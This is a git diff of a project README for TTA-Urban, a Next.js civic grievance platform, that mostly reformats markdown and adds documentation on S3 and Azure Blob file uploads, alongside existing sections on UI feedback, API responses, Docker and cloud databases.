@@ -2003,6 +2109,7 @@ test('submits form with valid data', async () => {
 7. **Scalability**: Handles complex forms with ease
 
 **This combination is used by:**
+
 - ✅ Vercel (Next.js dashboard)
 - ✅ GitHub (repository settings)
 - ✅ Stripe (payment forms)
@@ -2023,13 +2130,14 @@ This project implements comprehensive **user feedback patterns** using toasts, m
 
 User feedback is essential for building trust and clarity in your application:
 
-| Feedback Type | Example Use Case | UI Element | User Benefit |
-|---------------|------------------|------------|--------------|
-| **Instant Feedback** | "Item added to cart", "Saved successfully" | Toast / Snackbar | Non-intrusive confirmation |
-| **Blocking Feedback** | "Are you sure you want to delete?" | Modal / Dialog | Prevents accidental actions |
-| **Process Feedback** | "Uploading… please wait" | Loader / Spinner | Shows progress and status |
+| Feedback Type         | Example Use Case                           | UI Element       | User Benefit                |
+| --------------------- | ------------------------------------------ | ---------------- | --------------------------- |
+| **Instant Feedback**  | "Item added to cart", "Saved successfully" | Toast / Snackbar | Non-intrusive confirmation  |
+| **Blocking Feedback** | "Are you sure you want to delete?"         | Modal / Dialog   | Prevents accidental actions |
+| **Process Feedback**  | "Uploading… please wait"                   | Loader / Spinner | Shows progress and status   |
 
 **Key Principles:**
+
 - ✅ **Informative** – Users always know what's happening
 - ✅ **Non-intrusive** – Feedback doesn't block workflow unnecessarily
 - ✅ **Accessible** – Screen readers announce all feedback
@@ -2138,13 +2246,13 @@ toast("Custom message! 🎉", {
 ```typescript
 const onSubmit = async (data) => {
   const toastId = toast.loading("Creating your account...");
-  
+
   try {
     await fetch("/api/auth/signup", {
       method: "POST",
       body: JSON.stringify(data),
     });
-    
+
     toast.success("Account created successfully!", { id: toastId });
     setShowWelcomeModal(true);
   } catch (error) {
@@ -2154,6 +2262,7 @@ const onSubmit = async (data) => {
 ```
 
 **Features:**
+
 - ✅ **Auto-dismiss** – Disappears after 4 seconds (configurable)
 - ✅ **Accessible** – ARIA live regions for screen readers
 - ✅ **Update existing toasts** – Transform loading → success/error
@@ -2210,11 +2319,14 @@ const [showModal, setShowModal] = useState(false);
   confirmText="Delete"
   cancelText="Cancel"
 >
-  <p>Are you sure you want to delete this item? This action cannot be undone.</p>
-</Modal>
+  <p>
+    Are you sure you want to delete this item? This action cannot be undone.
+  </p>
+</Modal>;
 ```
 
 **Accessibility Features:**
+
 - ✅ **Focus trap** – Keyboard navigation stays inside modal
 - ✅ **ESC key** – Close modal with Escape key
 - ✅ **Click outside** – Close by clicking backdrop
@@ -2223,6 +2335,7 @@ const [showModal, setShowModal] = useState(false);
 - ✅ **Semantic HTML** – Uses native `<dialog>` element
 
 **Variants:**
+
 - **Default** – Indigo confirm button (informational)
 - **Danger** – Red confirm button (destructive actions)
 
@@ -2257,13 +2370,11 @@ Three types of loading indicators for different use cases:
 ```typescript
 const [progress, setProgress] = useState(0);
 
-<ProgressBar 
-  progress={progress} 
-  text="Uploading files..." 
-/>
+<ProgressBar progress={progress} text="Uploading files..." />;
 ```
 
 **Features:**
+
 - ✅ **ARIA attributes** – `role="status"`, `role="progressbar"`
 - ✅ **Screen reader text** – Hidden text announces loading state
 - ✅ **Smooth animations** – Spinning animation with CSS
@@ -2285,14 +2396,14 @@ const handleDelete = async (id) => {
 const confirmDelete = async () => {
   // 2. Show loading toast
   const toastId = toast.loading("Deleting item...");
-  
+
   try {
     // 3. API call with loader
     await fetch(`/api/items/${id}`, { method: "DELETE" });
-    
+
     // 4. Success toast
     toast.success("Item deleted successfully!", { id: toastId });
-    
+
     // 5. Close modal
     setShowDeleteModal(false);
   } catch (error) {
@@ -2310,13 +2421,13 @@ const confirmDelete = async () => {
 
 All feedback UI follows consistent design patterns:
 
-| State | Color | Icon | Usage |
-|-------|-------|------|-------|
-| **Success** | Green (#10b981) | ✓ Checkmark | Completed actions |
-| **Error** | Red (#ef4444) | ✗ Error | Failed operations |
-| **Warning** | Yellow (#f59e0b) | ⚠ Alert | Cautionary messages |
-| **Info** | Blue (#3b82f6) | ℹ Info | Informational updates |
-| **Loading** | Indigo (#4f46e5) | ↻ Spinner | Ongoing processes |
+| State       | Color            | Icon        | Usage                 |
+| ----------- | ---------------- | ----------- | --------------------- |
+| **Success** | Green (#10b981)  | ✓ Checkmark | Completed actions     |
+| **Error**   | Red (#ef4444)    | ✗ Error     | Failed operations     |
+| **Warning** | Yellow (#f59e0b) | ⚠ Alert     | Cautionary messages   |
+| **Info**    | Blue (#3b82f6)   | ℹ Info      | Informational updates |
+| **Loading** | Indigo (#4f46e5) | ↻ Spinner   | Ongoing processes     |
 
 ---
 
@@ -2364,22 +2475,26 @@ ariaProps: {
 **Test Checklist:**
 
 1. ✅ **Toast Visibility**
+
    - Toasts appear in correct position
    - Automatically dismiss after duration
    - Multiple toasts stack properly
 
 2. ✅ **Modal Interaction**
+
    - Opens and closes smoothly
    - ESC key works
    - Click outside closes modal
    - Focus returns to trigger element
 
 3. ✅ **Loading States**
+
    - Loaders show during async operations
    - Progress bars update correctly
    - Full screen loader blocks interaction
 
 4. ✅ **Accessibility**
+
    - Screen reader announces all feedback
    - Keyboard navigation works
    - Color contrast meets WCAG standards
@@ -2393,13 +2508,13 @@ ariaProps: {
 
 ### 📊 Real-World Use Cases
 
-| Scenario | Feedback Pattern | Implementation |
-|----------|------------------|----------------|
-| **Form Submission** | Loading toast → Success/Error toast | Toast updates on completion |
-| **Delete Action** | Modal → Loading toast → Success toast | Confirmation before destructive action |
-| **File Upload** | Progress bar → Success toast | Visual progress with percentage |
-| **API Call** | Inline loader → Toast notification | Non-blocking feedback |
-| **Bulk Operation** | Full screen loader → Summary modal | Blocking for heavy operations |
+| Scenario            | Feedback Pattern                      | Implementation                         |
+| ------------------- | ------------------------------------- | -------------------------------------- |
+| **Form Submission** | Loading toast → Success/Error toast   | Toast updates on completion            |
+| **Delete Action**   | Modal → Loading toast → Success toast | Confirmation before destructive action |
+| **File Upload**     | Progress bar → Success toast          | Visual progress with percentage        |
+| **API Call**        | Inline loader → Toast notification    | Non-blocking feedback                  |
+| **Bulk Operation**  | Full screen loader → Summary modal    | Blocking for heavy operations          |
 
 ---
 
@@ -2417,16 +2532,19 @@ ariaProps: {
 ### 🚀 Performance Considerations
 
 **Toast Optimizations:**
+
 - Toasts unmount after dismissal (no memory leaks)
 - CSS animations use `transform` (GPU accelerated)
 - Auto-dismiss prevents toast buildup
 
 **Modal Optimizations:**
+
 - Lazy rendering (only renders when open)
 - Focus trap only active when visible
 - Event listeners cleaned up on close
 
 **Loader Optimizations:**
+
 - Pure CSS animations (no JavaScript)
 - Conditional rendering (unmounts when not needed)
 - Minimal re-renders
@@ -2438,6 +2556,7 @@ ariaProps: {
 **Visit:** [`/feedback-demo`](ttaurban/app/feedback-demo/page.tsx)
 
 Interactive demonstration of all feedback patterns:
+
 - ✅ Success, error, loading, and custom toasts
 - ✅ Information and danger modals
 - ✅ All loader sizes and variants
@@ -2493,6 +2612,7 @@ User feedback isn't just about showing messages — it's about building **trust*
 5. **Professionalism** – Polished feedback separates amateur from professional apps
 
 **Real-World Impact:**
+
 - ✅ **Reduced Support Tickets** – Clear error messages help users self-serve
 - ✅ **Higher Conversion** – Users complete actions when they understand progress
 - ✅ **Better Retention** – Delightful UX keeps users coming back
@@ -2516,7 +2636,6 @@ Multi-language support
 
 Mobile app (React Native / Flutter)
 
-
 🔀 Branch Naming Conventions
 feature/<feature-name>
 fix/<bug-name>
@@ -2524,6 +2643,7 @@ docs/<update-name>
 chore/<task-name>
 
 Examples:
+
 - feature/complaint-form
 - fix/map-error
 - docs/readme-update
@@ -2537,15 +2657,19 @@ Create:
 Content:
 
 ## Summary
+
 Briefly explain the purpose of this PR.
 
 ## Changes Made
+
 - List important updates or fixes.
 
 ## Screenshots / Evidence
+
 (Add UI images or logs if relevant)
 
 ## Checklist
+
 - [ ] Code builds successfully
 - [ ] Lint & tests pass
 - [ ] No console errors or warnings
@@ -2557,6 +2681,7 @@ Briefly explain the purpose of this PR.
 Add this section in README:
 
 ### Code Review Checklist
+
 - Code follows naming conventions
 - Functionality tested locally
 - No console errors or warnings
@@ -2570,6 +2695,7 @@ Add this section in README:
 Add this:
 
 ### Branch Protection Rules (GitHub)
+
 - Require pull request before merging
 - Require at least 1 reviewer
 - Require all checks to pass (lint/test)
@@ -2577,6 +2703,7 @@ Add this:
 - Require PRs to be up-to-date before merging
 
 ### 🔧 Tech Stack
+
 ## Frontend – Next.js
 
 Next.js 14+ (App Router)
@@ -2597,7 +2724,6 @@ PWA Support (optional)
 
 ## Backend
 
-
 Node.js + Express (or Next.js API Routes)
 
 MongoDB / PostgreSQL
@@ -2610,33 +2736,34 @@ Cron Jobs for auto-escalation
 
 Cloud Storage (Cloudinary / AWS S3) for images
 
-
 ### 🏙️ TTA‑Urban – Transparency, Traceability & Accountability Complaint System
+
 A web-based grievance redressal platform that enables citizens to report civic issues and allows Urban Local Bodies (ULBs) to track, verify, and resolve them efficiently.
 This project focuses on providing transparency, traceability, and accountability in urban governance.
 
 ### 📁 Folder Structure
+
 your-project-name/
 ├── src/
-│   ├── app/                # App Router pages & routes (Home, Login, Dashboard...)
-│   ├── components/         # Reusable UI components (Navbar, Buttons, Cards)
-│   ├── lib/                # Helpers, configs, utilities
+│ ├── app/ # App Router pages & routes (Home, Login, Dashboard...)
+│ ├── components/ # Reusable UI components (Navbar, Buttons, Cards)
+│ ├── lib/ # Helpers, configs, utilities
 │
-├── public/                 # Static assets (images, icons)
-├── .gitignore              # Node, build & env files ignored here
-├── package.json            # Project dependencies & scripts
-├── README.md               # Documentation
-
+├── public/ # Static assets (images, icons)
+├── .gitignore # Node, build & env files ignored here
+├── package.json # Project dependencies & scripts
+├── README.md # Documentation
 
 ### ✔ What Each Folder Does
-Folder	Purpose
-src/app	Contains all page routes using the Next.js App Router architecture.
-src/components	Holds reusable UI components for cleaner and modular code.
-src/lib	Common utilities (API helpers, constants, configs).
-public	Stores images, logos, and static files.
 
+Folder Purpose
+src/app Contains all page routes using the Next.js App Router architecture.
+src/components Holds reusable UI components for cleaner and modular code.
+src/lib Common utilities (API helpers, constants, configs).
+public Stores images, logos, and static files.
 
 ### ⚙️ Setup Instructions
+
 🔧 1. Installation
 Make sure Node.js is installed.
 
@@ -2648,6 +2775,7 @@ Your app will run at:
 👉 http://localhost:3000
 
 ### 📝 Reflection
+
 This folder structure is chosen to:
 
 🔹 Keep the project scalable
@@ -2691,7 +2819,6 @@ $ npm run lint
 
 ![TTA-Urban](./ttaurban/public/assests/lint.png);
 
-
 ## 🌐 Global API Response Handler
 
 The TTA-Urban project implements a **Global API Response Handler** to ensure all API endpoints return responses in a consistent, structured, and predictable format. This unified approach improves developer experience (DX), simplifies error debugging, and strengthens observability in production environments.
@@ -2703,13 +2830,14 @@ Without a standard response format, every endpoint might return different shapes
 ✅ **Consistency** – Every endpoint speaks the same language  
 ✅ **Predictability** – Frontend can handle responses uniformly  
 ✅ **Debuggability** – Errors include timestamps and codes  
-✅ **Observability** – Easy integration with monitoring tools (Sentry, Datadog)  
+✅ **Observability** – Easy integration with monitoring tools (Sentry, Datadog)
 
 ### Unified Response Envelope
 
 All API endpoints follow this standard format:
 
 #### Success Response Structure
+
 ```json
 {
   "success": true,
@@ -2723,6 +2851,7 @@ All API endpoints follow this standard format:
 ```
 
 #### Error Response Structure
+
 ```json
 {
   "success": false,
@@ -2736,13 +2865,12 @@ All API endpoints follow this standard format:
 ```
 
 #### Paginated Response Structure
+
 ```json
 {
   "success": true,
   "message": "Complaints fetched successfully",
-  "data": [
-    { "id": 1, "title": "Broken streetlight", "status": "SUBMITTED" }
-  ],
+  "data": [{ "id": 1, "title": "Broken streetlight", "status": "SUBMITTED" }],
   "pagination": {
     "page": 1,
     "limit": 10,
@@ -2762,14 +2890,14 @@ The global response handler is implemented in two utility files:
 This file exports three main functions:
 
 - **`sendSuccess(data, message, status)`** – Returns a standardized success response
-- **`sendError(message, code, status, details)`** – Returns a standardized error response  
+- **`sendError(message, code, status, details)`** – Returns a standardized error response
 - **`sendPaginatedSuccess(data, page, limit, total, message)`** – Returns paginated data with metadata
 
 Example usage in an API route:
 
 ```typescript
-import { sendSuccess, sendError } from '@/app/lib/responseHandler';
-import { ERROR_CODES } from '@/app/lib/errorCodes';
+import { sendSuccess, sendError } from "@/app/lib/responseHandler";
+import { ERROR_CODES } from "@/app/lib/errorCodes";
 
 export async function GET() {
   try {
@@ -2777,9 +2905,9 @@ export async function GET() {
     return sendSuccess(users, "Users fetched successfully");
   } catch (error) {
     return sendError(
-      "Failed to fetch users", 
-      ERROR_CODES.USER_FETCH_ERROR, 
-      500, 
+      "Failed to fetch users",
+      ERROR_CODES.USER_FETCH_ERROR,
+      500,
       error
     );
   }
@@ -2796,16 +2924,16 @@ export const ERROR_CODES = {
   VALIDATION_ERROR: "E001",
   MISSING_REQUIRED_FIELDS: "E002",
   INVALID_EMAIL_FORMAT: "E003",
-  
+
   // Resource Errors (E100-E199)
   NOT_FOUND: "E100",
   USER_NOT_FOUND: "E102",
   COMPLAINT_NOT_FOUND: "E103",
-  
+
   // Conflict Errors (E200-E299)
   EMAIL_ALREADY_EXISTS: "E201",
   DEPARTMENT_NAME_EXISTS: "E203",
-  
+
   // Server Errors (E500-E599)
   INTERNAL_ERROR: "E500",
   USER_FETCH_ERROR: "E600",
@@ -2819,32 +2947,38 @@ export const ERROR_CODES = {
 The global response handler is used consistently across all API endpoints:
 
 **📁 `/api/users/route.ts`**
+
 - GET – Returns paginated list of users
 - POST – Creates a new user with validation
 
 **📁 `/api/complaints/route.ts`**
+
 - GET – Returns filtered, paginated complaints
 - POST – Creates a new complaint with validation
 
 **📁 `/api/departments/route.ts`**
+
 - GET – Returns paginated departments
 - POST – Creates a new department
 
 ### Developer Experience & Observability Benefits
 
 #### 🎯 Developer Experience (DX)
+
 1. **Predictable Frontend Logic** – No need to handle different response shapes per endpoint
 2. **Type Safety** – Response structure can be easily typed in TypeScript
 3. **Faster Onboarding** – New developers instantly understand the API contract
 4. **Consistent Error Handling** – Single error handling logic across the frontend
 
 #### 🔍 Observability & Debugging
+
 1. **Timestamps** – Every response includes ISO timestamp for tracking
 2. **Error Codes** – Unique codes make it easy to trace issues in logs
 3. **Detailed Errors** – Optional `details` field captures stack traces or context
 4. **Monitoring Integration** – Easy to parse and filter in APM tools (Sentry, Datadog, New Relic)
 
 #### Example Monitoring Query (Sentry/Datadog)
+
 ```javascript
 // Filter errors by code
 error.code == "E611"  // All complaint creation failures
@@ -2858,7 +2992,7 @@ response.success == false && response.error.code startsWith "E6"
 A clean, consistent API response structure is like proper punctuation in writing—it doesn't just make your sentences (endpoints) readable; it makes your entire story (application) coherent. By implementing this pattern:
 
 - **Frontend teams** can build with confidence, knowing exactly what to expect
-- **Backend teams** follow a clear contract when building new endpoints  
+- **Backend teams** follow a clear contract when building new endpoints
 - **DevOps teams** gain powerful tools for debugging and monitoring production issues
 - **Stakeholders** benefit from faster feature delivery and fewer bugs
 
@@ -2866,12 +3000,12 @@ This standardization turns our API from a collection of endpoints into a well-ar
 
 ---
 
-
 ## Team Branching Strategy & PR Workflow
 
 This section documents our recommended branching and pull request (PR) workflow to keep the repository consistent, reviewable, and safe for production.
 
-1) Branching strategy
+1. Branching strategy
+
 - **`main`**: Protected. Always green; only merge via PR when all checks pass.
 - **`develop`** (optional): Integration branch for completed features before release.
 - **Feature branches**: `feature/complaint-submission` � for new features and improvements.
@@ -2879,25 +3013,30 @@ This section documents our recommended branching and pull request (PR) workflow 
 - **Chore branches**: `chore/project-setup` � for maintenance tasks and infra changes.
 - **Docs branches**: `docs/workflow-docs` � documentation-only changes.
 
-2) Pull request workflow
+2. Pull request workflow
+
 - Open a PR from your feature branch into `main` (or `develop` if used).
 - Use a concise PR title and add a short description of changes and motivation.
 - Attach screenshots, logs, or design references when relevant.
 - Fill the PR checklist (see the template earlier in this README).
 
-3) Review & checks
+3. Review & checks
+
 - Require at least one reviewer (two for larger changes).
 - All continuous integration checks (lint, tests) must pass before merging.
 - Ensure PR is up to date with the target branch (resolve merge conflicts locally if any).
 
-4) Merging
+4. Merging
+
 - Use GitHubs Merge button (Squash merge preferred for feature branches to keep history tidy).
 - Avoid direct pushes to `main` � always use PRs.
 
-5) Hotfixes
+5. Hotfixes
+
 - Create a `fix/` branch from `main`, test locally, and open a PR into `main`. Tag the release if required.
 
-6) Helpful commands
+6. Helpful commands
+
 ```powershell
 # create a feature branch
 git checkout -b feature/my-feature
@@ -2910,7 +3049,8 @@ git rebase origin/main
 git push -u origin feature/my-feature
 ```
 
-7) Notes & etiquette
+7. Notes & etiquette
+
 - Keep commits small and focused. Write meaningful commit messages.
 - Link PRs to issues when applicable.
 - Avoid mixing unrelated changes in the same PR.
@@ -2924,6 +3064,7 @@ This project uses Docker and Docker Compose to containerize the entire applicati
 ### Services
 
 #### 1. Next.js App (`app`)
+
 - **Build context:** `./ttaurban`
 - **Port:** `3000`
 - **Environment variables:**
@@ -2932,6 +3073,7 @@ This project uses Docker and Docker Compose to containerize the entire applicati
 - **Dependencies:** Waits for `db` and `redis` to be ready before starting
 
 #### 2. PostgreSQL Database (`db`)
+
 - **Image:** `postgres:15-alpine`
 - **Port:** `5432`
 - **Credentials:**
@@ -2941,6 +3083,7 @@ This project uses Docker and Docker Compose to containerize the entire applicati
 - **Volume:** `db_data` persists database data across container restarts
 
 #### 3. Redis Cache (`redis`)
+
 - **Image:** `redis:7-alpine`
 - **Port:** `6379`
 - **Purpose:** Used for caching and session management
@@ -2991,6 +3134,7 @@ CMD ["npm", "run", "start"]  # Start the production server
 ### `.dockerignore`
 
 Excludes unnecessary files from the Docker build context:
+
 - `node_modules`, `.next`, `.git`
 - Environment files (`.env*`)
 - IDE configs, logs, test coverage
@@ -3000,15 +3144,19 @@ This speeds up builds and reduces image size.
 ### Troubleshooting
 
 **Issue:** Build fails with "The default export is not a React Component"
+
 - **Fix:** Ensure all page files in `app/` export a valid React component
 
 **Issue:** Port conflicts (e.g., port 3000 already in use)
+
 - **Fix:** Stop conflicting services or change the port mapping in `docker-compose.yml`
 
 **Issue:** Database connection errors
+
 - **Fix:** Verify `DATABASE_URL` matches the service name `db` and credentials in `docker-compose.yml`
 
 **Issue:** Slow builds
+
 - **Fix:** Use `.dockerignore` to exclude large folders; leverage Docker layer caching
 
 ### Docker Setup Evidence
@@ -3037,17 +3185,20 @@ All three containers are running successfully with proper port mappings and netw
 ### Reflection
 
 **Why Docker Compose?**
+
 - **Consistency:** Eliminates "works on my machine" issues by ensuring every developer runs the exact same environment (Node version, database version, Redis configuration)
 - **Simplicity:** Single command (`docker-compose up`) brings up the entire stack—no manual PostgreSQL or Redis installation required
 - **Isolation:** Each service runs in its own container without polluting the host system
 - **Production parity:** The same container images can be deployed to staging/production with minimal changes
 
 **Challenges Faced:**
+
 1. **Empty page components:** Initial build failed because `app/contact/page.js` and `app/dashboard/page.js` were empty. Fixed by adding placeholder React components.
 2. **Build time optimization:** First build took ~103s. Added comprehensive `.dockerignore` to exclude `node_modules`, `.next`, and other unnecessary files, reducing context transfer time.
 3. **Version warning:** Docker Compose showed a warning about the obsolete `version` attribute—while harmless, future iterations should remove it for cleaner output.
 
 **Future Improvements:**
+
 - Add health checks to ensure PostgreSQL is fully ready before the app starts
 - Implement multi-stage builds to reduce final image size
 - Configure environment-specific Docker Compose overrides (e.g., `docker-compose.prod.yml`)
@@ -3062,6 +3213,7 @@ This project supports production deployment with managed cloud databases using *
 ### Why Cloud Databases?
 
 Managed database services handle critical operational tasks:
+
 - ✅ **Automated backups** with point-in-time recovery
 - ✅ **Automatic patching** and security updates
 - ✅ **High availability** with multi-AZ deployment
@@ -3071,16 +3223,17 @@ Managed database services handle critical operational tasks:
 
 ### Supported Providers
 
-| Provider | Service | Cost (Development) | Documentation |
-|----------|---------|-------------------|---------------|
-| **AWS** | Amazon RDS PostgreSQL | ~$16/month | [Setup Guide](ttaurban/docs/CLOUD_DATABASE_SETUP.md#aws-rds-setup) |
-| **Azure** | Azure Database for PostgreSQL | ~$22/month | [Setup Guide](ttaurban/docs/CLOUD_DATABASE_SETUP.md#azure-postgresql-setup) |
+| Provider  | Service                       | Cost (Development) | Documentation                                                               |
+| --------- | ----------------------------- | ------------------ | --------------------------------------------------------------------------- |
+| **AWS**   | Amazon RDS PostgreSQL         | ~$16/month         | [Setup Guide](ttaurban/docs/CLOUD_DATABASE_SETUP.md#aws-rds-setup)          |
+| **Azure** | Azure Database for PostgreSQL | ~$22/month         | [Setup Guide](ttaurban/docs/CLOUD_DATABASE_SETUP.md#azure-postgresql-setup) |
 
 ### Quick Start
 
 #### 1. Choose Your Provider
 
 Follow the detailed provisioning guide:
+
 - 📘 **[Complete Setup Guide](ttaurban/docs/CLOUD_DATABASE_SETUP.md)** - Full documentation (6,000+ words)
 - 🚀 **[Quick Start Guide](ttaurban/docs/QUICK_START_CLOUD_DB.md)** - Step-by-step instructions
 
@@ -3089,12 +3242,14 @@ Follow the detailed provisioning guide:
 After provisioning your cloud database, update the appropriate environment file:
 
 **For AWS RDS:**
+
 ```bash
 # Edit .env.aws-rds with your RDS endpoint and credentials
 DATABASE_URL="postgresql://admin:YOUR_PASSWORD@your-instance.region.rds.amazonaws.com:5432/ttaurban"
 ```
 
 **For Azure PostgreSQL:**
+
 ```bash
 # Edit .env.azure-postgres with your Azure server details
 DATABASE_URL="postgresql://adminuser:YOUR_PASSWORD@your-server.postgres.database.azure.com:5432/ttaurban?ssl=true"
@@ -3155,6 +3310,7 @@ npm run db:verify:backups -- --provider=azure
 ### Features Implemented
 
 **🔍 Connection Validation**
+
 - 7-point comprehensive test suite
 - Network connectivity verification
 - Authentication testing
@@ -3163,6 +3319,7 @@ npm run db:verify:backups -- --provider=azure
 - Health check API endpoint
 
 **🚀 Automated Deployment**
+
 - One-command schema deployment
 - Database migration support
 - Automatic data seeding
@@ -3170,6 +3327,7 @@ npm run db:verify:backups -- --provider=azure
 - Deployment verification
 
 **📦 Backup Management**
+
 - Configuration verification
 - Automated backup reports
 - Best practices checklist
@@ -3177,6 +3335,7 @@ npm run db:verify:backups -- --provider=azure
 - Recovery procedure documentation
 
 **🔒 Security Features**
+
 - Network access control
 - SSL/TLS encryption
 - Credential management
@@ -3221,12 +3380,14 @@ Before deploying to production:
 ### Cost Optimization
 
 **Development Environment:**
+
 - Use smallest instance sizes (db.t3.micro / B1ms)
 - 7-day backup retention
 - Single availability zone
 - Stop instances when not in use (~50% savings)
 
 **Production Environment:**
+
 - Right-size based on actual load
 - Use Reserved Instances (save 60-65%)
 - Multi-AZ for high availability
@@ -3234,6 +3395,7 @@ Before deploying to production:
 - Enable autoscaling
 
 **Estimated Monthly Costs:**
+
 ```
 AWS RDS (db.t3.micro, 20GB):     $16-21
 Azure PostgreSQL (B1ms, 32GB):   $21-25
@@ -3243,6 +3405,7 @@ Production (with HA):            $50-100+
 ### Monitoring & Alerts
 
 **Built-in Health Check:**
+
 ```bash
 # API endpoint for monitoring
 GET http://your-app.com/api/health/db
@@ -3262,6 +3425,7 @@ GET http://your-app.com/api/health/db
 ```
 
 **Cloud Monitoring:**
+
 - AWS: CloudWatch metrics (CPU, connections, IOPS)
 - Azure: Azure Monitor (CPU%, memory%, storage%)
 - Custom alerts for connection failures
@@ -3277,6 +3441,7 @@ GET http://your-app.com/api/health/db
 ### Troubleshooting Cloud Database
 
 **Error: `ENOTFOUND` - Cannot connect**
+
 ```
 Cause: Database endpoint not configured or incorrect
 Solution:
@@ -3286,6 +3451,7 @@ Solution:
 ```
 
 **Error: `28P01` - Authentication failed**
+
 ```
 Cause: Wrong username or password
 Solution:
@@ -3295,6 +3461,7 @@ Solution:
 ```
 
 **Error: `ETIMEDOUT` - Connection timeout**
+
 ```
 Cause: Firewall blocking connection
 Solution:
@@ -3304,6 +3471,7 @@ Solution:
 ```
 
 **Script shows placeholder errors**
+
 ```
 This is expected if you haven't provisioned a cloud database yet!
 The .env files contain template values. Follow the Quick Start Guide
@@ -3322,6 +3490,444 @@ to provision your database and update the configuration.
 
 ---
 
+## 📦 Object Storage Configuration (AWS S3 / Azure Blob)
+
+This project supports secure file uploads and storage using **AWS S3** or **Azure Blob Storage** with presigned URLs and SAS tokens for temporary access.
+
+### Why Object Storage?
+
+Cloud object storage provides scalable, secure file management:
+
+- ✅ **Scalable** - Store unlimited files without server disk management
+- ✅ **Secure** - Private buckets with temporary access URLs
+- ✅ **Cost-effective** - Pay only for storage used (~$0.023/GB/month)
+- ✅ **Durable** - 99.999999999% durability (11 nines)
+- ✅ **CDN integration** - Fast global delivery with CloudFront/Azure CDN
+- ✅ **Lifecycle policies** - Auto-delete old files to save costs
+
+### Supported Providers
+
+| Provider  | Service      | Cost (5GB storage) | Key Feature                          |
+| --------- | ------------ | ------------------ | ------------------------------------ |
+| **AWS**   | Amazon S3    | ~$0.12/month       | Presigned URLs (5-10 min expiry)     |
+| **Azure** | Blob Storage | ~$0.10/month       | SAS tokens with granular permissions |
+
+### Quick Start
+
+#### 1. Configure Environment
+
+**For AWS S3:**
+
+```bash
+# Copy template
+cp .env.s3 .env.local
+
+# Edit .env.local with your S3 credentials
+AWS_REGION=us-east-1
+AWS_ACCESS_KEY_ID=your-access-key-id
+AWS_SECRET_ACCESS_KEY=your-secret-access-key
+AWS_BUCKET_NAME=ttaurban-uploads
+
+# File validation settings
+MAX_FILE_SIZE=5242880                          # 5MB in bytes
+ALLOWED_FILE_TYPES=image/jpeg,image/png,application/pdf
+PRESIGNED_URL_EXPIRATION=300                   # 5 minutes
+```
+
+**For Azure Blob Storage:**
+
+```bash
+# Copy template
+cp .env.blob .env.local
+
+# Edit .env.local with your Azure credentials
+AZURE_STORAGE_ACCOUNT_NAME=youraccountname
+AZURE_STORAGE_ACCOUNT_KEY=your-account-key
+AZURE_CONTAINER_NAME=uploads
+AZURE_STORAGE_REGION=eastus
+
+# File validation settings (same as S3)
+MAX_FILE_SIZE=5242880
+ALLOWED_FILE_TYPES=image/jpeg,image/png,application/pdf
+SAS_TOKEN_EXPIRATION=5                         # 5 minutes
+```
+
+#### 2. Test Configuration
+
+```bash
+# Test AWS S3 setup
+npm run storage:test:s3
+
+# Test Azure Blob setup
+npm run storage:test:blob
+
+# Expected output:
+# ✅ Configuration Check:
+#    ✓ AWS_REGION: Configured
+#    ✓ AWS_ACCESS_KEY_ID: Configured
+#    ✓ AWS_BUCKET_NAME: Configured
+# 🎉 S3 Configuration Valid!
+```
+
+#### 3. Install Dependencies
+
+```bash
+# AWS S3 SDK
+npm install @aws-sdk/client-s3 @aws-sdk/s3-request-presigner
+
+# Azure Blob SDK
+npm install @azure/storage-blob
+```
+
+#### 4. Try the Upload Demo
+
+Navigate to `/storage-demo` in your browser to test file uploads:
+
+```
+http://localhost:3000/storage-demo
+```
+
+**Features:**
+
+- Switch between S3 and Azure Blob providers
+- Drag-and-drop file upload
+- Client-side validation (file type, size)
+- Upload progress tracking
+- Download uploaded files
+- Upload history with timestamps
+
+### API Endpoints
+
+#### Generate Upload URL
+
+**S3:**
+
+```bash
+POST /api/storage/s3/upload-url
+Content-Type: application/json
+
+{
+  "fileName": "document.pdf",
+  "fileType": "application/pdf",
+  "fileSize": 1024000
+}
+
+# Response
+{
+  "uploadUrl": "https://s3.amazonaws.com/bucket/...",
+  "key": "uploads/1234567890-document.pdf",
+  "expiresIn": 300
+}
+```
+
+**Azure Blob:**
+
+```bash
+POST /api/storage/blob/upload-url
+Content-Type: application/json
+
+{
+  "fileName": "photo.jpg",
+  "fileType": "image/jpeg",
+  "fileSize": 512000
+}
+
+# Response
+{
+  "uploadUrl": "https://account.blob.core.windows.net/...",
+  "blobName": "uploads/1234567890-photo.jpg",
+  "expiresIn": 300
+}
+```
+
+#### Generate Download URL
+
+**S3:**
+
+```bash
+POST /api/storage/s3/download-url
+Content-Type: application/json
+
+{
+  "key": "uploads/1234567890-document.pdf"
+}
+
+# Response
+{
+  "downloadUrl": "https://s3.amazonaws.com/bucket/...",
+  "expiresIn": 300
+}
+```
+
+**Azure Blob:**
+
+```bash
+POST /api/storage/blob/download-url
+Content-Type: application/json
+
+{
+  "blobName": "uploads/1234567890-photo.jpg"
+}
+
+# Response
+{
+  "downloadUrl": "https://account.blob.core.windows.net/...",
+  "expiresIn": 300
+}
+```
+
+### Usage Example
+
+```typescript
+// Client-side upload flow
+async function uploadFile(file: File, provider: "s3" | "blob") {
+  // 1. Get presigned upload URL from your API
+  const response = await fetch(`/api/storage/${provider}/upload-url`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      fileName: file.name,
+      fileType: file.type,
+      fileSize: file.size,
+    }),
+  });
+
+  const { uploadUrl, key, blobName } = await response.json();
+
+  // 2. Upload directly to S3/Blob using presigned URL
+  await fetch(uploadUrl, {
+    method: "PUT",
+    body: file,
+    headers: {
+      "Content-Type": file.type,
+      ...(provider === "blob" && { "x-ms-blob-type": "BlockBlob" }),
+    },
+  });
+
+  // 3. Store key/blobName in your database
+  const fileId = provider === "s3" ? key : blobName;
+  return fileId;
+}
+
+// Download file
+async function downloadFile(fileId: string, provider: "s3" | "blob") {
+  const response = await fetch(`/api/storage/${provider}/download-url`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      [provider === "s3" ? "key" : "blobName"]: fileId,
+    }),
+  });
+
+  const { downloadUrl } = await response.json();
+  window.open(downloadUrl, "_blank");
+}
+```
+
+### Security Best Practices
+
+#### 1. Access Control
+
+- ✅ Buckets/containers set to **Private** (no public access)
+- ✅ IAM user with minimal S3 permissions (`s3:PutObject`, `s3:GetObject`)
+- ✅ Azure SAS tokens with specific permissions (Read, Write only)
+- ❌ Never expose AWS/Azure credentials to client-side code
+
+#### 2. File Validation
+
